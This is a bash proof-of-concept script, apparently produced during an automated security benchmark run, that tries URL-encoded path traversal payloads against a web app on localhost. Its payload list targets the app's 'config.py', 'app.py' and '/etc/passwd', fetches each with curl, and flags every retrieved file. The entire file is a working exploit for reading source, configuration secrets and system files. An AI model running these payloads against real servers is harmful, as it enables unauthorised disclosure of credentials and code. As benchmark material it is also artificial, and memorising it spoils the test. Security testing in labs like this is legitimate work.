#!/bin/bash
# POC: Tests multiple URL-encoding variations for path traversal bypass
# Target: ./repo
# Created: 2025-11-06T21:45:03.208Z
# Session: benchmark-XBEN-065-24-mhny77r3

# URL-Encoded Path Traversal Bypass POC - Version 2
# Testing various URL encoding techniques for %2e%2e

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-5001}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "========================================"
echo "URL-Encoded Path Traversal POC v2"
echo "========================================"
echo "Target: $BASE_URL"
echo ""

# Array of traversal payloads to test
declare -a PAYLOADS=(
    "/static/%2e%2e/static/css/style.css"
    "/static/%2e%2e%2fstatic%2fcss%2fstyle.css"
    "/static/%2e%2e/config.py"
    "/static/%2e%2e/app.py"
    "/static/%2e%2e/static/css/style.css"
    "/static/%2e%2e/../../etc/passwd"
)

for PAYLOAD in "${PAYLOADS[@]}"; do
    echo "Testing: $PAYLOAD"
    RESPONSE=$(curl -s -w "\n%{http_code}" "$BASE_URL$PAYLOAD" 2>&1)
    HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
    BODY=$(echo "$RESPONSE" | head -n -1)
    BODY_SIZE=$(echo "$BODY" | wc -c)
    
    echo "  HTTP Status: $HTTP_CODE"
    echo "  Size: $BODY_SIZE bytes"
    
    # Check if we got a 200 response (success)
    if [ "$HTTP_CODE" = "200" ]; then
        echo "  ✓ SUCCESS - File retrieved!"
        echo "  Preview: $(echo "$BODY" | head -c 100)..."
    fi
    echo ""
done

echo "========================================"